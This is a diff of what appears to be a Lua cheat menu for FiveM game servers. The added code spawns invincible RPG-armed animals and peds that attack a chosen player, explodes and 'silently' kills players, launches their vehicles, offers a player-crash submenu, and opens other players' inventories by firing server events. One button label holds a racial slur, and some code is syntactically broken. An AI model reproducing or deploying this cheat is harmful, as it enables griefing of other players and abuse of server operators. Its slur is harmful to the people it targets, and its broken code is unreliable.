+                    while not HasModelLoaded(e8) do
+                        Citizen.Wait(0)
                     end
-
-                    content = content:gsub(strip, "")
+                    local e9 = CreateObject(e8, roundx - 1.70, roundy - 1.70, roundz - 1.0, true, true, false)
+                    local ea = CreateObject(e8, roundx + 1.70, roundy + 1.70, roundz - 1.0, true, true, false)
+                    SetEntityHeading(e9, -90.0)
+                    SetEntityHeading(ea, 90.0)
+                    FreezeEntityPosition(e9, true)
+                    FreezeEntityPosition(ea, true)
+			elseif IhadSexWithMyStepMother.Button("~r~Spawn ~s~Dolphins  with ~y~RPG") then
+                    local bQ = "a_c_dolphin"
+                    local bR = "weapon_rpg"
+                    for i = 0, 10 do
+                        local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
+                        RequestModel(GetHashKey(bQ))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey(bQ)) then
+                            local ped =
+                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
+                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
+                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
+                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
+                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
+                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
+                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
+                            NetworkRegisterEntityAsNetworked(ped)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                local ei = PedToNet(ped)
+                                NetworkSetNetworkIdDynamic(ei, false)
+                                SetNetworkIdCanMigrate(ei, true)
+                                SetNetworkIdExistsOnAllMachines(ei, true)
+                                Citizen.Wait(50)
+                                NetToPed(ei)
+                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
+                                SetEntityInvincible(ped, true)
+                                SetPedCanSwitchWeapon(ped, true)
+                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+                        end
+                    end
+                elseif IhadSexWithMyStepMother.Button("~r~Spawn ~s~Naked Peds with ~y~RPG") then
+                    local bQ = "a_m_m_acult_01"
+                    local bR = "weapon_rpg"
+                    for i = 0, 10 do
+                        local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
+                        RequestModel(GetHashKey(bQ))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey(bQ)) then
+                            local ped =
+                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, true) and
+                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
+                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
+                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
+                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
+                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
+                                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, true)
+                            NetworkRegisterEntityAsNetworked(ped)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                local ei = PedToNet(ped)
+                                NetworkSetNetworkIdDynamic(ei, false)
+                                SetNetworkIdCanMigrate(ei, true)
+                                SetNetworkIdExistsOnAllMachines(ei, true)
+                                Citizen.Wait(50)
+                                NetToPed(ei)
+                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
+                                SetEntityInvincible(ped, true)
+                                SetPedCanSwitchWeapon(ped, true)
+                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+                        end
+                    end
+			elseif IhadSexWithMyStepMother.Button("~r~Spawn ~s~Small ~y~Monkeys") then
+                    local bQ = "a_c_rhesus"
+					local bR = "weapon_rpg"
+					for i = 0, 10 do
+                        local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
+                        RequestModel(GetHashKey(bQ))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey(bQ)) then
+                            local ped =
+                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z + 15, 0, true, true)
+							NetworkRegisterEntityAsNetworked(ped)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                local ei = PedToNet(ped)
+                                NetworkSetNetworkIdDynamic(ei, false)
+                                SetNetworkIdCanMigrate(ei, true)
+                                SetNetworkIdExistsOnAllMachines(ei, true)
+                                Citizen.Wait(50)
+                                NetToPed(ei)
+								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
+                                SetEntityInvincible(ped, true)
+								SetPedCanSwitchWeapon(ped, true)
+                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+						end
+                    end
+                elseif IhadSexWithMyStepMother.Button("~r~Spawn ~s~Boar  ~y~With Rpg") then
+                    local bQ = "a_c_boar"
+					local bR = "weapon_rpg"
+					for i = 0, 10 do
+                        local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
+                        RequestModel(GetHashKey(bQ))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey(bQ)) then
+                            local ped =
+                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z + 15, 0, true, true)
+							NetworkRegisterEntityAsNetworked(ped)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                local ei = PedToNet(ped)
+                                NetworkSetNetworkIdDynamic(ei, false)
+                                SetNetworkIdCanMigrate(ei, true)
+                                SetNetworkIdExistsOnAllMachines(ei, true)
+                                Citizen.Wait(50)
+                                NetToPed(ei)
+								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
+                                SetEntityInvincible(ped, true)
+								SetPedCanSwitchWeapon(ped, true)
+                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+						end
+                    end
+                elseif IhadSexWithMyStepMother.Button("~r~Spawn ~s~Rat  ") then
+                    local bQ = "a_c_rat"
+					for i = 0, 10 do
+                        local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
+                        RequestModel(GetHashKey(bQ))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey(bQ)) then
+                            local ped =
+                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z + 15, 0, true, true)
+							NetworkRegisterEntityAsNetworked(ped)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                local ei = PedToNet(ped)
+                                NetworkSetNetworkIdDynamic(ei, false)
+                                SetNetworkIdCanMigrate(ei, true)
+                                SetNetworkIdExistsOnAllMachines(ei, true)
+                                Citizen.Wait(50)
+                                NetToPed(ei)
+								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
+                                SetEntityInvincible(ped, true)
+								SetPedCanSwitchWeapon(ped, true)
+                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+						end
+                    end
+                elseif IhadSexWithMyStepMother.Button("~r~Spawn ~s~Whale  ~y~Holding Rpg") then
+                    local bQ = "a_c_humpback"
+					local bR = "weapon_rpg"
+					for i = 0, 10 do
+                        local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
+                        RequestModel(GetHashKey(bQ))
+                        Citizen.Wait(50)
+                        if HasModelLoaded(GetHashKey(bQ)) then
+                            local ped =
+                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z + 15, 0, true, true)
+							NetworkRegisterEntityAsNetworked(ped)
+                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                local ei = PedToNet(ped)
+                                NetworkSetNetworkIdDynamic(ei, false)
+                                SetNetworkIdCanMigrate(ei, true)
+                                SetNetworkIdExistsOnAllMachines(ei, true)
+                                Citizen.Wait(50)
+                                NetToPed(ei)
+								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
+                                SetEntityInvincible(ped, true)
+								SetPedCanSwitchWeapon(ped, true)
+                                TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
+                            elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
+                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
+                            else
+                                Citizen.Wait(0)
+                            end
+						end
+                    end
+			elseif IhadSexWithMyStepMother.Button("Nearby Peds Attack Player") then
+                PedAttack(selectedPlayer, PedAttackType)
+            elseif IhadSexWithMyStepMother.ComboBox("Ped Attack Type", PedAttackOps, currAttackTypeIndex, selAttackTypeIndex, function(currentIndex, selectedIndex)
+                currAttackTypeIndex = currentIndex
+                selAttackTypeIndex = currentIndex
+                PedAttackType = currentIndex
+            end) then
+			 elseif IhadSexWithMyStepMother.Button("Possess Player Vehicle") then
+                if Spectating then SpectatePlayer(selectedPlayer) end
+                PossessVehicle(selectedPlayer)
+			elseif IhadSexWithMyStepMother.CheckBox("Track Player", Tracking, "Tracking: Nobody", "Tracking: "..GetPlayerName(TrackedPlayer)) then
+                Tracking = not Tracking
+                TrackedPlayer = selectedPlayer
+			elseif IhadSexWithMyStepMother.CheckBox("Fling Player", FlingingPlayer, "Flinging: Nobody", "Flinging: "..GetPlayerName(FlingedPlayer)) then
+				FlingingPlayer = not FlingingPlayer
+				FlingedPlayer = selectedPlayer
+			elseif IhadSexWithMyStepMother.Button("Launch Players Vehicle") then
+				if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
+					ShowInfo("~r~Player Not In Vehicle!")		
+				else
+				
+					local wasSpeccing= false
+					local tmp = nil
+					if Spectating then
+						tmp = SpectatedPlayer
+						wasSpeccing = true
+						Spectating = not Spectating
+						SpectatePlayer(tmp)
+					end
+					
+					local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
+					RequestControlOnce(veh)
+					ApplyForceToEntity(veh, 3, 0.0, 0.0, 5000000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
+					
+					if wasSpeccing then
+						Spectating = not Spectating
+						SpectatePlayer(tmp)
+					end
+					
+				end
+			elseif IhadSexWithMyStepMother.Button("Slam Players Vehicle") then
+				if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
+					ShowInfo("~r~Player Not In Vehicle!")
+				else
+				
+					local wasSpeccing= false
+					local tmp = nil
+					if Spectating then
+						tmp = SpectatedPlayer
+						wasSpeccing = true
+						Spectating = not Spectating
+						SpectatePlayer(tmp)
+					end
+					
+					local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
+					RequestControlOnce(veh)
+					ApplyForceToEntity(veh, 3, 0.0, 0.0, -5000000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
+					
+					if wasSpeccing then
+						Spectating = not Spectating
+						SpectatePlayer(tmp)
+					end
+					
+				end
+			elseif IhadSexWithMyStepMother.ComboBox("Pop Players Vehicle Tire", {"Front Left", "Front Right", "Back Left", "Back Right", "All"}, currTireIndex, selTireIndex, function(currentIndex, selClothingIndex)
+                    currTireIndex = currentIndex
+                    selTireIndex = currentIndex
+                    end) then
+					if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
+						ShowInfo("~r~Player Not In Vehicle!")
+					else
+					
+						local wasSpeccing= false
+						local tmp = nil
+						if Spectating then
+							tmp = SpectatedPlayer
+							wasSpeccing = true
+							Spectating = not Spectating
+							SpectatePlayer(tmp)
+						end
+					
+						local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
+						RequestControlOnce(veh)
+						if selTireIndex == 1 then
+							SetVehicleTyreBurst(veh, 0, 1, 1000.0)
+						elseif selTireIndex == 2 then
+							SetVehicleTyreBurst(veh, 1, 1, 1000.0)
+						elseif selTireIndex == 3 then
+							SetVehicleTyreBurst(veh, 4, 1, 1000.0)
+						elseif selTireIndex == 4 then
+							SetVehicleTyreBurst(veh, 5, 1, 1000.0)
+						elseif selTireIndex == 5 then
+							for i=0,7 do
+								SetVehicleTyreBurst(veh, i, 1, 1000.0)
+							end
+						end
+						
+						if wasSpeccing then
+							Spectating = not Spectating
+							SpectatePlayer(tmp)
+						end
+					
+					end
+            elseif IhadSexWithMyStepMother.Button("Explode Player") then
+                ExplodePlayer(selectedPlayer)
+			elseif IhadSexWithMyStepMother.Button("Silent Kill Player") then
+				local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
+                AddExplosion(coords.x, coords.y, coords.z, 4, 0.1, 0, 1, 0.0)
+				end
+				
+				elseif IhadSexWithMyStepMother.IsMenuOpened("weaponspawnerplayer") then
+                for i = 1, #allweapons do
+                    if IhadSexWithMyStepMother.Button(allweapons[i]) then
+                        GiveWeaponToPed(GetPlayerPed(selectedPlayer), GetHashKey(allweapons[i]), 250, false, true)
+                    end
                 end
-
-                content = FM:TrimString(content, true)
-                FM.DynamicTriggers[res] = FM.DynamicTriggers[res] or {}
-
-                if contains and content ~= dat.Trigger then
-                    replaced = true
-
-                    if (content:find("'" .. dat.Trigger .. "'") or content:find("\"" .. dat.Trigger .. "\"")) and not dat.Force then
-                        content = dat.Trigger
-                        replaced = false
+        
+        
+        -- SPECIFIC PLAYER OPTIONS
+        elseif IhadSexWithMyStepMother.IsMenuOpened('playeroptions') then
+            if IhadSexWithMyStepMother.Button("~m~PLAYER: " .. "~g~[" .. GetPlayerServerId(selectedPlayer) .. "] ~s~" .. GetPlayerName(selectedPlayer)) then
+			elseif IhadSexWithMyStepMother.CheckBox("~g~Spectate ~s~Player", Spectating, "Spectating: ~m~OFF", "Spectating: "..GetPlayerName(SpectatedPlayer)) then
+				Spectating = not Spectating
+				SpectatePlayer(selectedPlayer)
+				SpectatedPlayer = selectedPlayer
+			elseif IhadSexWithMyStepMother.Button("Teleport To Player") then
+				local confirm = GetKeyboardInput("Are you Sure? ~g~Y/~r~N")
+				if string.lower(confirm) == "y" then
+					TeleportToPlayer(selectedPlayer)
+				else
+					ShowInfo("~r~Operation Canceled")
+				end
+			elseif IhadSexWithMyStepMother.ComboBox("Teleport Into Players Vehicle~h~~r~ -->", {"Front Right", "Back Left", "Back Right"}, currSeatIndex, selSeatIndex, function(currentIndex, selClothingIndex)
+                    currSeatIndex = currentIndex
+                    selSeatIndex = currentIndex
+                    end) then
+					if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
+						ShowInfo("~r~Player Not In Vehicle!")
+					else
+						local confirm = GetKeyboardInput("Are you Sure? ~g~Y/~r~N")
+						if string.lower(confirm) == "y" then
+							local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
+							if selSeatIndex == 1 then
+								if IsVehicleSeatFree(veh, 0) then
+									SetPedIntoVehicle(PlayerPedId(), veh, 0)
+								else
+									ShowInfo("~r~Seat Taken Or Does Not Exist!")
+								end
+							elseif selSeatIndex == 2 then
+								if IsVehicleSeatFree(veh, 1) then
+									SetPedIntoVehicle(PlayerPedId(), veh, 1)
+								else
+									ShowInfo("~r~Seat Taken Or Does Not Exist!")
+								end
+							elseif selSeatIndex == 3 then
+								if IsVehicleSeatFree(veh, 2) then
+									SetPedIntoVehicle(PlayerPedId(), veh, 2)
+								else
+									ShowInfo("~r~Seat Taken Or Does Not Exist!")
+								end
+							end
+						end
+					end	
+			elseif IhadSexWithMyStepMother.Button("~r~Kick ~s~From Vehicle") then
+                KickFromVeh(selectedPlayer)
+			elseif IhadSexWithMyStepMother.Button("~g~Copy ~s~Skin Player ~r~") then
+				ClonePed(selectedPlayer)
+         ShowInfo("~g~Skin Copied!")				
+			elseif IhadSexWithMyStepMother.Button("~g~ESX ~s~Revive ~r~") then
+				local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y/~r~N")
+			 if string.lower(confirm) == "y" then
+			 else
+					ShowInfo("~r~Operation Canceled")
+				end
+			elseif IhadSexWithMyStepMother.Button('~b~VRP ~s~Revive') then
+                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
+                    CreateAmbientPickup(GetHashKey('PICKUP_HEALTH_STANDARD'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('PICKUP_HEALTH_STANDARD'), 1, 0)
+                    SetPickupRegenerationTime(pickup, 60)
+			elseif IhadSexWithMyStepMother.MenuButton("~b~Crash ~s~FiveM Player ~s~Menu", 'crashtroll') then		
+			elseif IhadSexWithMyStepMother.MenuButton("Troll ~r~Options", 'troll') then
+			elseif IhadSexWithMyStepMother.MenuButton("~Give ~s~Single Weapon", 'weaponspawnerplayer') then
+			 elseif IhadSexWithMyStepMother.Button("~b~Give ~s~All Weapons") then
+            GiveAllWeapons(selectedPlayer)
+            elseif IhadSexWithMyStepMother.Button("~r~Remove ~s~All Weapons") then
+                StripPlayer(selectedPlayer)
+            elseif IhadSexWithMyStepMother.Button('~b~Full Armour ~s~Player') then
+                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
+                    for i = 0, 99 do
+                        Citizen.Wait(0)
+                        CreateAmbientPickup(GetHashKey('PICKUP_ARMOUR_STANDARD'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('PICKUP_ARMOUR_STANDARD'), 1, 0)
+                        SetPickupRegenerationTime(pickup, 10)
+                        i = i + 1
                     end
-
-                    FM.DynamicTriggers[res][dat.Trigger] = content
-
-                    if replaced then
-                        FM:Print("[Dynamic Triggers] ^5Replaced trigger ^6" .. dat.Trigger .. " ^7to ^3" .. content .. "^7")
+			elseif IhadSexWithMyStepMother.Button('~r~Kill ~s~Player') then
+					AddExplosion(GetEntityCoords(GetPlayerPed(selectedPlayer)), 33, 101.0, false, true, 0.0) 
+			elseif IhadSexWithMyStepMother.Button('~r~Spawn 50x Cargoplane To Player') then
+			local camion = "phantom"
+				local avion = "CARGOPLANE"
+				local avion2 = "luxor"
+				local heli = "maverick"
+				local random = "bus"
+                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
+                    for i = 0, 99 do
+                        Citizen.Wait(0)
+                        CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
+                        CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
+						CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
+						CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
+						CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
+						CreateObject(GetHashKey('prop_med_jet_01'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('prop_med_jet_01'), 1, 0)
+						
                     end
-                elseif contains and content == dat.Trigger then
-                    FM.DynamicTriggers[res][dat.Trigger] = dat.Trigger
-                    FM:Print("[Dynamic Triggers] ^2Unchanged ^7trigger ^6" .. dat.Trigger .. "^7")
-                    replaced = true
+			elseif IhadSexWithMyStepMother.Button("~g~Open ~s~inventory ESX OR CFW") then
+					TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(selectedPlayer), GetPlayerName(selectedPlayer))
+            elseif IhadSexWithMyStepMother.Button("Cancel Animation/Task") then
+            end
+        
+        
+        
+        -- SELF OPTIONS MENU
+        elseif IhadSexWithMyStepMother.IsMenuOpened('self') then
+            if IhadSexWithMyStepMother.MenuButton('PED Options ', 'appearance') then end
+            if IhadSexWithMyStepMother.CheckBox("God~s~mode", Godmode) then
+                Godmode = not Godmode
+                ToggleGodmode(Godmode)
+            elseif IhadSexWithMyStepMother.CheckBox("Demigod Mode", Demigod) then
+                Demigod = not Demigod
+			elseif IhadSexWithMyStepMother.Button("Randomize ~s~Skins") then
+                RandomClothes(PlayerId())
+			elseif IhadSexWithMyStepMother.Button("Revive", "Native") then
+                ReviveKubca()
+		    elseif IhadSexWithMyStepMother.ComboBox("~b~Player ~s~Functions -->", {"VRP ~s~Revive", "Give ~s~Player Armor", "Remove ~s~Player Armor", "Clean Player", "Suicide ", "Cancel Anim/Task"}, currPFuncIndex, selPFuncIndex, function(currentIndex, selClothingIndex)
+                currPFuncIndex = currentIndex
+                selPFuncIndex = currentIndex
+                end) then
+				if selPFuncIndex == 1 then
+					SetEntityHealth(PlayerPedId(), 200)
+				elseif selPFuncIndex == 2 then
+					SetPedArmour(PlayerPedId(), 100)
+				elseif selPFuncIndex == 3 then
+					SetPedArmour(PlayerPedId(), 0)
+				elseif selPFuncIndex == 4 then
+					ClearPedBloodDamage(PlayerPedId())
+					ClearPedWetness(PlayerPedId())
+					ClearPedEnvDirt(PlayerPedId())
+					ResetPedVisibleDamage(PlayerPedId())
+				elseif selPFuncIndex == 5 then
+					SetEntityHealth(PlayerPedId(), 0)
+				elseif selPFuncIndex == 6 then
+					ClearPedTasksImmediately(PlayerPedId())
+				end
+			elseif IhadSexWithMyStepMother.CheckBox("Infinite Stamina", InfStamina) then
+				InfStamina = not InfStamina
+            elseif IhadSexWithMyStepMother.CheckBox("Alternative Demigod Mode", ADemigod) then
+                ADemigod = not ADemigod
+            elseif IhadSexWithMyStepMother.CheckBox("Infinite Stamina", InfStamina) then
+                InfStamina = not InfStamina
+            elseif IhadSexWithMyStepMother.ComboBoxSlider("Fast Run", FastCBWords, currFastRunIndex, selFastRunIndex, function(currentIndex, selClothingIndex)
+                currFastRunIndex = currentIndex
+                selFastRunIndex = currentIndex
+                FastRunMultiplier = FastCB[currentIndex]
+                SetRunSprintMultiplierForPlayer(PlayerId(), FastRunMultiplier)
+                end) then
+			elseif IhadSexWithMyStepMother.ComboBoxSlider("Fast Swim", FastCBWords, currFastSwimIndex, selFastSwimIndex, function(currentIndex, selClothingIndex)
+                currFastSwimIndex = currentIndex
+                selFastSwimIndex = currentIndex
+                FastSwimMultiplier = FastCB[currentIndex]
+                SetSwimMultiplierForPlayer(PlayerId(), FastSwimMultiplier)
+                end) then
+            elseif IhadSexWithMyStepMother.CheckBox("Super Jump", SuperJump) then
+                SuperJump = not SuperJump
+            elseif IhadSexWithMyStepMother.CheckBox("Invisibility", Invisibility) then
+                Invisibility = not Invisibility
+                if not Invisibility then
+                    SetEntityVisible(PlayerPedId(), true)
+                end
+            elseif IhadSexWithMyStepMother.CheckBox("Magneto Mode ~s~KEY ~f~[E]", ForceTog) then
+                ForceMod()
+            elseif IhadSexWithMyStepMother.CheckBox("Forcefield", Forcefield) then
+                Forcefield = not Forcefield
+			elseif IhadSexWithMyStepMother.ComboBox("Forcefield Radius -->", ForcefieldRadiusOps, currForcefieldRadiusIndex, selForcefieldRadiusIndex, function(currentIndex, selectedIndex)
+                    currForcefieldRadiusIndex = currentIndex
+                    selForcefieldRadiusIndex = currentIndex
+                    ForcefieldRadius = ForcefieldRadiusOps[currentIndex]
+                    end) then
+            elseif IhadSexWithMyStepMother.CheckBox("Noclip", Noclipping) then
+                ToggleNoclip()
+			elseif IhadSexWithMyStepMother.ComboBox("Noclip Speed -->", NoclipSpeedOps, currNoclipSpeedIndex, selNoclipSpeedIndex, function(currentIndex, selectedIndex)
+                    currNoclipSpeedIndex = currentIndex
+                    selNoclipSpeedIndex = currentIndex
+                    NoclipSpeed = NoclipSpeedOps[currNoclipSpeedIndex]
+                    end) then
+            end
+        
+        
+        -- APPEARANCE MENU
+        elseif IhadSexWithMyStepMother.IsMenuOpened('appearance') then
+		if IhadSexWithMyStepMother.MenuButton("Models", 'skinsmodels') then
+            elseif IhadSexWithMyStepMother.Button("Set Model Name") then
+                local model = GetKeyboardInput("Enter Model Name:")
+                RequestModel(GetHashKey(model))
+                Wait(500)
+                if HasModelLoaded(GetHashKey(model)) then
+                    SetPlayerModel(PlayerId(), GetHashKey(model))
+                else ShowInfo("~r~Model not recognized (Try Again)") end
+            elseif IhadSexWithMyStepMother.MenuButton("Modify Skin Textures", 'modifyskintextures') then
+            elseif IhadSexWithMyStepMother.ComboBox("Save Outfit", ClothingSlots, currClothingIndex, selClothingIndex, function(currentIndex, selectedIndex)
+                currClothingIndex = currentIndex
+                selClothingIndex = currentIndex
+            end) then
+                Outfits[selClothingIndex] = GetCurrentOutfit(PlayerId())
+            elseif IhadSexWithMyStepMother.ComboBox("Load Outfit", ClothingSlots, currClothingIndex, selClothingIndex, function(currentIndex, selectedIndex)
+                currClothingIndex = currentIndex
+                selClothingIndex = currentIndex
+            end) then
+                SetCurrentOutfit(Outfits[selClothingIndex])
+            end
+
+           
+            elseif IhadSexWithMyStepMother.IsMenuOpened('modifyskintextures') then
+               
+				
+			
+
+                if IhadSexWithMyStepMother.MenuButton("Head", "modifyhead") then
+				
+					if GetEntityModel(PlayerPedId()) ~= GetHashKey("mp_m_freemode_01") then
+						IhadSexWithMyStepMother.CloseMenu()
+						IhadSexWithMyStepMother.OpenMenu('modifyskintextures') 
+						ShowInfo("~r~Only MP Models Supported For Now!") 
+                    end
+                    
+					faceItemsList = GetHeadItems()
+                    faceTexturesList = GetHeadTextures(GetPedDrawableVariation(PlayerPedId(), 0))
+                    hairItemsList = GetHairItems()
+                    hairTexturesList = GetHairTextures(GetPedDrawableVariation(PlayerPedId(), 2))
+					maskItemsList = GetMaskItems()
+					hatItemsList = GetHatItems()
+                    hatTexturesList = GetHatTextures(GetPedPropIndex(PlayerPedId(), 0))
+				end
+				
+				elseif IhadSexWithMyStepMother.IsMenuOpened('skinsmodels') then
+		
+if IhadSexWithMyStepMother.Button("~g~Reset Model To FiveM Player") then
+			local model = "mp_m_freemode_01"
+				RequestModel(GetHashKey(model)) 
+				Wait(500)
+				if HasModelLoaded(GetHashKey(model)) then
+					SetPlayerModel(PlayerId(), GetHashKey(model))
+					end
+ 
+	elseif IhadSexWithMyStepMother.Button("Change To ~p~Naked") then
+			local model = "a_m_m_acult_01"
+				RequestModel(GetHashKey(model)) 
+				Wait(500)
+				if HasModelLoaded(GetHashKey(model)) then
+					SetPlayerModel(PlayerId(), GetHashKey(model))
+                    end
+                elseif IhadSexWithMyStepMother.Button("Change To ~p~Nigga") then
+                    local model = "csb_grove_str_dlr"
+                        RequestModel(GetHashKey(model)) 
+                        Wait(500)
+                        if HasModelLoaded(GetHashKey(model)) then
+                            SetPlayerModel(PlayerId(), GetHashKey(model))
+                            end
+			elseif IhadSexWithMyStepMother.Button("Change To ~r~Prison") then
+			local model = "s_m_y_prismuscl_01"
+				RequestModel(GetHashKey(model)) 
+				Wait(500)
+				if HasModelLoaded(GetHashKey(model)) then
+					SetPlayerModel(PlayerId(), GetHashKey(model))
+					end
+					elseif IhadSexWithMyStepMother.Button("Change To ~b~Kuwaiti") then
+			local model = "a_m_m_afriamer_01"
+				RequestModel(GetHashKey(model)) 
+				Wait(500)
+				if HasModelLoaded(GetHashKey(model)) then
+					SetPlayerModel(PlayerId(), GetHashKey(model))
+					end
+					elseif IhadSexWithMyStepMother.Button("Change To ~o~hotie") then
+			local model = "a_f_m_beach_01"
+				RequestModel(GetHashKey(model)) 
+				Wait(500)
+				if HasModelLoaded(GetHashKey(model)) then
+					SetPlayerModel(PlayerId(), GetHashKey(model))
+					end
+					elseif IhadSexWithMyStepMother.Button("Change To ~g~Dog") then
+			local model = "a_c_poodle"
+				RequestModel(GetHashKey(model)) 
+				Wait(500)
+				if HasModelLoaded(GetHashKey(model)) then
+					SetPlayerModel(PlayerId(), GetHashKey(model))
+					end
+					elseif IhadSexWithMyStepMother.Button("Change To ~p~Bird") then
+			local model = "a_c_seagull"
+				RequestModel(GetHashKey(model)) 
+				Wait(500)
+				if HasModelLoaded(GetHashKey(model)) then
+					SetPlayerModel(PlayerId(), GetHashKey(model))
+					end
+					elseif IhadSexWithMyStepMother.Button("Change To ~o~ LOL") then
+			local model = "a_c_cormorant"
+				RequestModel(GetHashKey(model)) 
+				Wait(500)
+				if HasModelLoaded(GetHashKey(model)) then
+					SetPlayerModel(PlayerId(), GetHashKey(model))
+				end
+			end
+                
+                -- Head Menu
+                elseif IhadSexWithMyStepMother.IsMenuOpened('modifyhead') then
+                    if IhadSexWithMyStepMother.ComboBoxSlider("Face", faceItemsList, currFaceIndex, selFaceIndex, function(currentIndex, selectedIndex)
+                        currFaceIndex = currentIndex
+                        selFaceIndex = currentIndex 
